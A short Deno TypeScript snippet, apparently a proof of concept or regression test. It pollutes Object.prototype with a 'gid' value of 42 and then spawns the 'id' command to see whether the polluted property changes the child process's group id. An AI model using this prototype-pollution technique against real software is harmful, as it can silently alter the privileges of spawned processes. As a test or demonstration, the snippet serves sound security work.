function pollute(key: string, value: any) {
    ((((Object as any).prototype as any)[key]) as any) = value;
}

pollute("gid", 42);
const process = new Deno.Command("id");
process.spawn()
